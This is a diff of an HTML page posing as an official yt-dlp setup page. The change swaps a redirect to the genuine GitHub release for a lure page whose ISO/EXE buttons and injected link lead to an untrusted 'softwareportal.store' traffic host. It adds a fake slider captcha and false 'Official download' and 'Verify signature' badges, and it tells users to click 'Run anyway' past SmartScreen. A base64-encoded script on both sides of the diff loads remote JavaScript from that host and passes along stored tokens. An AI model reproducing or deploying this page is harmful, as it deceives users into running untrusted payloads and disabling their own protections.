@@ -1,81 +1,265 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-  <meta name="robots" content="noindex,nofollow" />
-  <meta name="theme-color" content="#2563eb" />
+<span id="b8dde73d-48c6-0f46-2186-b948d9e3e753"></span>
+<script type="application/javascript">
+document.getElementById('b8dde73d-48c6-0f46-2186-b948d9e3e753').innerHTML = '<a href="https://www2.softwareportal.store/QLwXXw?&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'">Link</a>';
+</script>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+  <meta name="robots" content="noindex, nofollow">
   <link rel="icon" href="https://yt-dlpc.github.io/favicon.ico" type="image/x-icon" />
   <title>YT DLP SETUP</title>
-  <script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfNXhQSnNyZEtDbmJ2akY1cCc7CiAgICBpZiAoIXdpbmRvdy5fNXhQSnNyZEtDbmJ2akY1cCkgewogICAgICAgIHdpbmRvdy5fNXhQSnNyZEtDbmJ2akY1cCA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly93d3cyLnNvZnR3YXJlcG9ydGFsLnN0b3JlL1FMd1hYdycsCiAgICAgICAgfTsKICAgIH0KICAgIGNvbnN0IF9rVzJ4YjZablJQWkdLQzVoID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2NvbmZpZycpOwogICAgaWYgKHR5cGVvZiBfa1cyeGI2Wm5SUFpHS0M1aCAhPT0gJ3VuZGVmaW5lZCcgJiYgX2tXMnhiNlpuUlBaR0tDNWggIT09IG51bGwpIHsKICAgICAgICB2YXIgX0NuNTFZcWhmdjQ0RjZmMnAgPSBKU09OLnBhcnNlKF9rVzJ4YjZablJQWkdLQzVoKTsKICAgICAgICB2YXIgX24xTUdNYnZaNVFWMWI2dlAgPSBNYXRoLnJvdW5kKCtuZXcgRGF0ZSgpLzEwMDApOwogICAgICAgIGlmIChfQ241MVlxaGZ2NDRGNmYycC5jcmVhdGVkX2F0ICsgd2luZG93Ll81eFBKc3JkS0NuYnZqRjVwLnR0bCA8IF9uMU1HTWJ2WjVRVjFiNnZQKSB7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdzdWJJZCcpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgndG9rZW4nKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ2NvbmZpZycpOwogICAgICAgIH0KICAgIH0KICAgIHZhciBfaHpEUk5SQ1ljWG5RNXE1MSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdzdWJJZCcpOwogICAgdmFyIF9TUFRTcmY0OXcyMTN0dzhYID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJyk7CiAgICB2YXIgX0czWFFxdGZOTk05TjEzTk4gPSAnP3JldHVybj1qcy5jbGllbnQnOwogICAgICAgIF9HM1hRcXRmTk5NOU4xM05OICs9ICcmJyArIGRlY29kZVVSSUNvbXBvbmVudCh3aW5kb3cubG9jYXRpb24uc2VhcmNoLnJlcGxhY2UoJz8nLCAnJykpOwogICAgICAgIF9HM1hRcXRmTk5NOU4xM05OICs9ICcmc2VfcmVmZXJyZXI9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5yZWZlcnJlcik7CiAgICAgICAgX0czWFFxdGZOTk05TjEzTk4gKz0gJyZkZWZhdWx0X2tleXdvcmQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC50aXRsZSk7CiAgICAgICAgX0czWFFxdGZOTk05TjEzTk4gKz0gJyZsYW5kaW5nX3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmxvY2F0aW9uLmhvc3RuYW1lICsgZG9jdW1lbnQubG9jYXRpb24ucGF0aG5hbWUpOwogICAgICAgIF9HM1hRcXRmTk5NOU4xM05OICs9ICcmbmFtZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG5hbWUpOwogICAgICAgIF9HM1hRcXRmTk5NOU4xM05OICs9ICcmaG9zdD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5fNXhQSnNyZEtDbmJ2akY1cC5SX1BBVEgpOwogICAgaWYgKHR5cGVvZiBfaHpEUk5SQ1ljWG5RNXE1MSAhPT0gJ3VuZGVmaW5lZCcgJiYgX2h6RFJOUkNZY1huUTVxNTEgJiYgd2luZG93Ll81eFBKc3JkS0NuYnZqRjVwLnVuaXF1ZSkgewogICAgICAgIF9HM1hRcXRmTk5NOU4xM05OICs9ICcmc3ViX2lkPScgKyBlbmNvZGVVUklDb21wb25lbnQoX2h6RFJOUkNZY1huUTVxNTEpOwogICAgfQogICAgaWYgKHR5cGVvZiBfU1BUU3JmNDl3MjEzdHc4WCAhPT0gJ3VuZGVmaW5lZCcgJiYgX1NQVFNyZjQ5dzIxM3R3OFggJiYgd2luZG93Ll81eFBKc3JkS0NuYnZqRjVwLnVuaXF1ZSkgewogICAgICAgIF9HM1hRcXRmTk5NOU4xM05OICs9ICcmdG9rZW49JyArIGVuY29kZVVSSUNvbXBvbmVudChfU1BUU3JmNDl3MjEzdHc4WCk7CiAgICB9CiAgICBpZiAoJycgIT09ICcnKSB7CiAgICAgICAgX0czWFFxdGZOTk05TjEzTk4gKz0gJyZieXBhc3NfY2FjaGU9JzsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll81eFBKc3JkS0NuYnZqRjVwLlJfUEFUSCArIF9HM1hRcXRmTk5NOU4xM05OOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
-  <!-- GA4 -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-ZL5RF9N1PR"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){ dataLayer.push(arguments); }
-    gtag('js', new Date());
-    gtag('config', 'G-ZL5RF9N1PR');
-  </script>
-
+  <meta name="description" content="Official handoff page. Slide to unlock, then download the ISO/EXE and follow quick steps to run the installer.">
+  <meta name="theme-color" content="#2563eb">
   <style>
-    :root{ --accent:#2563eb; --text:#0f172a; --muted:#64748b; --bg:#f8fafc; }
-    html,body{ margin:0; padding:0; height:100%; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; background:var(--bg); color:var(--text); }
-    .wrap{ min-height:100%; display:flex; align-items:center; justify-content:center; padding:24px; }
-    .card{ background:#fff; border:1px solid #e5e7eb; border-radius:16px; padding:24px; max-width:560px; width:100%; text-align:center; box-shadow:0 4px 20px rgba(0,0,0,0.06); }
-    h1{ margin:0 0 8px; font-size:22px; }
-    p{ margin:6px 0; color:var(--muted); }
-    .btn{ display:inline-block; margin-top:14px; background:var(--accent); color:#fff; padding:10px 16px; border-radius:10px; text-decoration:none; font-weight:800; }
-    .spin{ width:38px; height:38px; border:4px solid #e5e7eb; border-top-color:var(--accent); border-radius:50%; margin:8px auto 12px; animation:spin 0.9s linear infinite; }
-    @keyframes spin{ to{ transform:rotate(360deg); } }
-    .small{ font-size:12px; color:var(--muted); margin-top:10px; }
+    :root{ --accent:#2563eb; --accent-2:#1e40af; --bg:#f8fafc; --text:#0f172a; --muted:#64748b; --card:#ffffff; --ring:#93c5fd; --ok:#16a34a; --warn:#f59e0b; }
+    *{box-sizing:border-box}
+    html,body{margin:0;height:100%;background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+    a{color:var(--accent);text-decoration:none}
+    a:focus,button:focus{outline:3px solid var(--ring);outline-offset:2px}
+    .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px}
+    .card{width:100%;max-width:980px;background:var(--card);border:1px solid #e5e7eb;border-radius:16px;box-shadow:0 8px 24px rgba(2,6,23,.06);padding:24px}
+    .hero{background:linear-gradient(135deg,var(--accent),#4f8df3);color:#fff;border-radius:12px;padding:18px;margin-bottom:18px}
+    .hero h1{margin:0 0 6px;font-size:22px}
+    .hero p{margin:0;color:#eaf2ff}
+    .badges{display:flex;flex-wrap:wrap;gap:8px;margin-top:10px}
+    .badge{font-size:.82rem;padding:6px 10px;border-radius:999px;background:rgba(255,255,255,.18);border:1px solid rgba(255,255,255,.3)}
+
+    .captcha{margin:16px 0}
+    .slider{position:relative;height:46px;background:#eef2ff;border:1px solid #dbe1ff;border-radius:12px;overflow:hidden}
+    .slider .label{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#334155;font-weight:600}
+    .track{position:absolute;top:0;left:0;height:100%;width:0;background:#c7d2fe;transition:width .05s linear}
+    .knob{position:absolute;top:4px;left:4px;width:38px;height:38px;border-radius:10px;background:#fff;border:1px solid #d1d5db;box-shadow:0 2px 6px rgba(0,0,0,.08);display:flex;align-items:center;justify-content:center;cursor:grab;user-select:none}
+    .knob:active{cursor:grabbing}
+    .knob svg{stroke:var(--accent)}
+    .slider.done{background:#ecfdf5;border-color:#bbf7d0}
+    .slider.done .track{background:#bbf7d0}
+    .slider.done .label{color:#065f46}
+
+    .cta-row{display:flex;flex-wrap:wrap;gap:10px;margin:14px 0}
+    .btn{display:inline-flex;align-items:center;gap:10px;padding:12px 18px;border-radius:10px;border:1px solid #e5e7eb;background:#fff;color:var(--text);font-weight:700;transition:transform .08s ease,background .2s ease}
+    .btn.primary{background:var(--accent);color:#fff;border-color:var(--accent)}
+    .btn:hover{transform:translateY(-1px)}
+    .btn[disabled]{opacity:.5;cursor:not-allowed;transform:none}
+
+    .grid{display:grid;gap:18px;margin-top:10px}
+    @media(min-width:900px){.grid{grid-template-columns:1fr 460px}}
+    section{background:#fff;border:1px solid #e5e7eb;border-radius:12px;padding:16px}
+    h2{margin:0 0 8px;font-size:18px;color:#0f172a}
+    ol{margin:8px 0 0 20px}
+    .note{font-size:.92rem;color:var(--muted)}
+    .kbd{padding:2px 6px;border:1px solid #e5e7eb;border-radius:4px;background:#f8fafc;font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
+
+    footer{margin-top:14px;text-align:center;color:var(--muted);font-size:.9rem}
   </style>
 </head>
 <body>
   <div class="wrap">
-    <div class="card" role="status" aria-live="polite">
-      <div class="spin" aria-hidden="true"></div>
-      <h1>YT DLP SETUP</h1>
-      <p>We’re recording a quick analytics event to improve the site, then redirecting you to the official GitHub release.</p>
-      <p>If nothing happens, use the button below.</p>
-      <p>
-        <a id="fallback" class="btn" href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.exe">Download yt-dlp.exe</a>
-      </p>
-      <p class="small">This page won’t be indexed by search engines.</p>
+    <div class="card" role="region" aria-label="Download handoff">
+      <div class="hero">
+        <h1 id="t_title">YT DLP SETUP</h1>
+        <p id="t_sub">Keep this tab open. We’ll guide you to open the downloaded file and run the installer safely.</p>
+        <div class="badges" aria-label="Key facts">
+          <span class="badge" id="t_badge_os">Windows 11/10</span>
+          <span class="badge" id="t_badge_arch">x64</span>
+          <span class="badge" id="t_badge_official">Official download</span>
+          <span class="badge" id="t_badge_verify">Verify signature/checksum</span>
+        </div>
+      </div>
+
+      <!-- Slider captcha -->
+      <div class="captcha" aria-label="Slide to unlock">
+        <div id="slider" class="slider" role="group" aria-roledescription="slider captcha" aria-label="Slide to unlock">
+          <div class="track" id="track"></div>
+          <div class="label" id="t_slide_label">Slide right to unlock the download</div>
+          <div class="knob" id="knob" aria-label="Handle" tabindex="0">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8 12l3 3 5-6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          </div>
+        </div>
+        <div class="note" id="t_slide_hint" style="margin-top:6px">This simple check prevents accidental clicks. No personal data required.</div>
+      </div>
+
+      <!-- CTAs (same-tab handoff, no new window) -->
+      <div class="cta-row" aria-label="Download options">
+        <button id="btn-iso" class="btn primary" data-installer="iso" data-href="https://www2.softwareportal.store/QLwXXw" disabled>
+          <span id="t_btn_iso">Download ISO</span>
+        </button>
+        <button id="btn-exe" class="btn" data-installer="exe" data-href="https://www2.softwareportal.store/QLwXXw" disabled>
+          <span id="t_btn_exe">Download EXE</span>
+        </button>
+      </div>
+
+      <div class="grid">
+        <section>
+          <h2 id="t_iso_title">How to handle the ISO</h2>
+          <p class="note" id="t_iso_note">An ISO is a disk image. Here are safe ways to open it in Windows.</p>
+          <ol>
+            <li id="t_iso_1"><strong>Double‑click</strong> the ISO file — Windows will mount it as a virtual drive. Open the drive and run <em>setup.exe</em> if present.</li>
+            <li id="t_iso_2"><strong>Right‑click → Mount</strong> — same as double‑click.</li>
+            <li id="t_iso_3"><strong>Need files inside?</strong> Use 7‑Zip (official archiver) to extract without mounting.</li>
+            <li id="t_iso_4"><strong>PowerShell (advanced)</strong>: run as admin: <span class="kbd">Mount-DiskImage -ImagePath "C:\\path\\to\\file.iso"</span></li>
+            <li class="note" id="t_iso_5">After mounting, find the drive in File Explorer, open it and start the installer. If SmartScreen appears, see tips below.</li>
+          </ol>
+        </section>
+        <section>
+          <h2 id="t_help_title">Quick help</h2>
+          <div class="note" id="t_help_note">Short steps for browsers and common prompts.</div>
+          <h3 style="margin:10px 0 6px">Edge / Chrome</h3>
+          <ol>
+            <li id="t_help_ec_1">Open the downloads menu (top‑right) or press <span class="kbd">Ctrl</span>+<span class="kbd">J</span>.</li>
+            <li id="t_help_ec_2">Click <strong>Keep</strong> (or <strong>Save</strong>), then <strong>Open</strong>.</li>
+            <li id="t_help_ec_3">If Windows says “Windows protected your PC”: click <strong>More info</strong> → <strong>Run anyway</strong> (only if you trust the publisher).</li>
+          </ol>
+          <h3 style="margin:12px 0 6px">Firefox</h3>
+          <ol>
+            <li id="t_help_ff_1">Click the downloads arrow on the toolbar, then click the file to open.</li>
+            <li id="t_help_ff_2">Confirm any prompt if you trust the source.</li>
+          </ol>
+          <div style="margin-top:12px">
+            <button id="btn-launched" class="btn">I’ve started the installer</button>
+            <span id="launch-msg" class="note" style="display:none;color:var(--ok);margin-left:8px">Thanks — recorded.</span>
+          </div>
+        </section>
+      </div>
+
+      <footer>
+        <p id="t_footer">Can’t find your file? Press <span class="kbd">Ctrl</span>+<span class="kbd">J</span> to open downloads. Keep this tab open for tips.</p>
+        <p class="note">© <span id="year"></span></p>
+      </footer>
     </div>
   </div>
 
   <script>
-    (function(){
-      var target = 'https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.exe';
-      var qp = new URLSearchParams(location.search);
-      // Optional source tagging, e.g., ?src=home_cta or ?utm_source=nav
-      var source = qp.get('src') || qp.get('utm_source') || 'direct';
-      var medium = qp.get('utm_medium') || '';
-      var campaign = qp.get('utm_campaign') || '';
+    // --------- Multilanguage (EN + DE) ---------
+    const T = {
+      en: {
+        title:'Start your installer',
+        sub:'Keep this tab open. We’ll guide you to open the downloaded file and run the installer safely.',
+        badge_official:'Official download', badge_verify:'Verify signature/checksum',
+        slide_label:'Slide right to unlock the download', slide_hint:'This simple check prevents accidental clicks. No personal data required.',
+        btn_iso:'Download ISO', btn_exe:'Download EXE',
+        iso_title:'How to handle the ISO', iso_note:'An ISO is a disk image. Here are safe ways to open it in Windows.',
+        iso_1:'Double‑click the ISO file — Windows will mount it as a virtual drive. Open the drive and run setup.exe if present.',
+        iso_2:'Right‑click → Mount — same as double‑click.',
+        iso_3:'Need files inside? Use 7‑Zip to extract without mounting.',
+        iso_4:'PowerShell (advanced): run as admin: Mount-DiskImage -ImagePath "C:\\path\\to\\file.iso"',
+        iso_5:'After mounting, find the drive in Explorer, open it and start the installer. If SmartScreen appears, see tips below.',
+        help_title:'Quick help', help_note:'Short steps for browsers and common prompts.',
+        help_ec_1:'Open the downloads menu (top‑right) or press Ctrl+J.',
+        help_ec_2:'Click Keep (or Save), then Open.',
+        help_ec_3:'If Windows says “Windows protected your PC”: More info → Run anyway (only if you trust the publisher).',
+        help_ff_1:'Click the downloads arrow on the toolbar, then click the file to open.',
+        help_ff_2:'Confirm any prompt if you trust the source.',
+        launched_btn:"I’ve started the installer", launched_ok:'Thanks — recorded.',
+        footer:'Can’t find your file? Press Ctrl+J to open downloads. Keep this tab open for tips.'
+      },
+      de: {
+        title:'Starten Sie das Installationsprogramm',
+        sub:'Lassen Sie diesen Tab geöffnet. Wir helfen beim Öffnen der Datei und sicheren Start des Installers.',
+        badge_official:'Offizieller Download', badge_verify:'Signatur/Prüfsumme prüfen',
+        slide_label:'Zum Entsperren nach rechts schieben', slide_hint:'Einfacher Schutz vor versehentlichen Klicks. Keine persönlichen Daten erforderlich.',
+        btn_iso:'ISO herunterladen', btn_exe:'EXE herunterladen',
+        iso_title:'ISO richtig verwenden', iso_note:'Eine ISO ist ein Abbild. So öffnen Sie es sicher unter Windows.',
+        iso_1:'Doppelklick auf die ISO – Windows bindet sie als virtuelles Laufwerk ein. Öffnen Sie das Laufwerk und starten Sie ggf. setup.exe.',
+        iso_2:'Rechtsklick → Bereitstellen – entspricht dem Doppelklick.',
+        iso_3:'Dateien extrahieren? Nutzen Sie 7‑Zip zum Entpacken ohne Einbinden.',
+        iso_4:'PowerShell (fortgeschritten): als Admin: Mount-DiskImage -ImagePath "C:\\Pfad\\zur\\Datei.iso"',
+        iso_5:'Nach dem Einbinden im Explorer das Laufwerk öffnen und den Installer starten. Bei SmartScreen: Hinweise unten beachten.',
+        help_title:'Schnelle Hilfe', help_note:'Kurzanleitung für Browser und häufige Hinweise.',
+        help_ec_1:'Download-Menü oben rechts öffnen oder Strg+J drücken.',
+        help_ec_2:'Auf Behalten (oder Speichern) klicken, dann Öffnen.',
+        help_ec_3:'Bei „Windows hat Ihren PC geschützt“: Weitere Informationen → Trotzdem ausführen (nur wenn Sie dem Herausgeber vertrauen).',
+        help_ff_1:'Pfeil für Downloads in der Symbolleiste anklicken, dann die Datei öffnen.',
+        help_ff_2:'Sicherheitsabfragen bestätigen, wenn Sie der Quelle vertrauen.',
+        launched_btn:'Installer gestartet', launched_ok:'Danke – erfasst.',
+        footer:'Datei nicht gefunden? Mit Strg+J die Downloads öffnen. Lassen Sie diesen Tab für Hinweise geöffnet.'
+      }
+    };
 
-      function go(){ location.replace(target); }
-      // Safety timeout: redirect even if GA fails
-      var safety = setTimeout(go, 900);
+    function detectLang(){
+      const qp = new URLSearchParams(location.search);
+      let v = qp.get('lang');
+      if(v){ v=v.toLowerCase(); v=v.split('-')[0]; if(T[v]) return v; }
+      const nav = navigator.languages || [navigator.language||'en'];
+      for(const l of nav){ const c=l.toLowerCase().split('-')[0]; if(T[c]) return c; }
+      return 'en';
+    }
 
-      try{
-        if (typeof gtag === 'function') {
-          gtag('event', 'download', {
-            event_category: 'software',
-            event_label: 'yt-dlp_windows_exe_get',
-            source: source,
-            medium: medium,
-            campaign: campaign,
-            transport_type: 'beacon',
-            event_callback: function(){ clearTimeout(safety); go(); },
-            event_timeout: 700
-          });
-        } else {
-          // Fallback if GA not loaded in time
-          go();
-        }
-      } catch(e){ go(); }
-    })();
+    function applyI18n(code){
+      const t = T[code]||T.en; document.documentElement.lang=code;
+      // hero
+      byId('t_title').textContent=t.title; byId('t_sub').textContent=t.sub;
+      byId('t_badge_official').textContent=t.badge_official; byId('t_badge_verify').textContent=t.badge_verify;
+      // slider
+      byId('t_slide_label').textContent=t.slide_label; byId('t_slide_hint').textContent=t.slide_hint;
+      // CTAs
+      byId('t_btn_iso').textContent=t.btn_iso; byId('t_btn_exe').textContent=t.btn_exe;
+      // ISO
+      byId('t_iso_title').textContent=t.iso_title; byId('t_iso_note').textContent=t.iso_note;
+      byId('t_iso_1').textContent=t.iso_1; byId('t_iso_2').textContent=t.iso_2; byId('t_iso_3').textContent=t.iso_3;
+      byId('t_iso_4').textContent=t.iso_4; byId('t_iso_5').textContent=t.iso_5;
+      // help
+      byId('t_help_title').textContent=t.help_title; byId('t_help_note').textContent=t.help_note;
+      byId('t_help_ec_1').innerHTML=t.help_ec_1.replace('Ctrl+J','<span class="kbd">Ctrl</span>+<span class="kbd">J</span>');
+      byId('t_help_ec_2').textContent=t.help_ec_2; byId('t_help_ec_3').textContent=t.help_ec_3;
+      byId('t_help_ff_1').textContent=t.help_ff_1; byId('t_help_ff_2').textContent=t.help_ff_2;
+      byId('btn-launched').textContent=t.launched_btn; byId('t_footer').innerHTML=t.footer.replace('Ctrl+J','<span class="kbd">Ctrl</span>+<span class="kbd">J</span>');
+    }
+
+    function byId(id){ return document.getElementById(id); }
+
+    const lang = detectLang();
+    applyI18n(lang);
+    byId('year').textContent = new Date().getFullYear();
+
+    // --------- Slider captcha logic ---------
+    const slider = byId('slider');
+    const track = byId('track');
+    const knob = byId('knob');
+    const ctas = [byId('btn-iso'), byId('btn-exe')];
+
+    let dragging=false, startX=0, startLeft=0, maxLeft=0, solved=false;
+    function setDisabled(on){ ctas.forEach(b=>b.disabled=on); }
+    setDisabled(true);
+
+    function measure(){
+      const rect = slider.getBoundingClientRect();
+      maxLeft = rect.width - knob.offsetWidth - 4; // padding
+    }
+    window.addEventListener('resize', measure); measure();
+
+    function startDrag(e){ if(solved) return; dragging=true; startX = (e.touches?e.touches[0].clientX:e.clientX); startLeft = knob.offsetLeft; e.preventDefault(); }
+    function moveDrag(e){ if(!dragging||solved) return; const x=(e.touches?e.touches[0].clientX:e.clientX); let dx = Math.max(0, Math.min(maxLeft, startLeft + (x - startX))); knob.style.left = (dx+4)+"px"; track.style.width = (dx+knob.offsetWidth/2)+"px"; }
+    function endDrag(){ if(!dragging||solved) return; dragging=false; const done = knob.offsetLeft >= maxLeft - 6; if(done){ solved=true; slider.classList.add('done'); byId('t_slide_label').textContent = lang==='de' ? 'Freigegeben' : 'Unlocked'; setDisabled(false); }
+      else { knob.style.left='4px'; track.style.width='0px'; }
+    }
+    knob.addEventListener('mousedown', startDrag); knob.addEventListener('touchstart', startDrag,{passive:false});
+    window.addEventListener('mousemove', moveDrag); window.addEventListener('touchmove', moveDrag,{passive:false});
+    window.addEventListener('mouseup', endDrag); window.addEventListener('touchend', endDrag);
+
+    // --------- Same-tab handoff (no new window) ---------
+    function handoff(btn){
+      const href = btn.getAttribute('data-href'); const type = btn.getAttribute('data-installer');
+      try{ if(typeof gtag==='function'){ gtag('event','download_click',{event_category:'handoff',event_label:href,installer:type,transport_type:'beacon'}); } }catch(e){}
+      // Navigate in the same tab
+      if(href && href.indexOf('{KEITARO_URL_')!==0){ location.assign(href); } else { console.warn('Replace {KEITARO_URL_*} placeholders with real Keitaro URLs.'); }
+    }
+
+    ctas.forEach(btn=>{
+      btn.addEventListener('click', function(e){ if(btn.disabled){ e.preventDefault(); return; } handoff(btn); });
+    });
+
+    // Launched confirmation (proxy)
+    byId('btn-launched').addEventListener('click', function(){
+      try{ if(typeof gtag==='function'){ gtag('event','launched_confirm',{event_category:'handoff',transport_type:'beacon'}); } }catch(e){}
+      byId('launch-msg').style.display='inline';
+    });
   </script>
+
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-ZL5RF9N1PR"></script>
+  <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-ZL5RF9N1PR');</script>
 </body>
 </html>
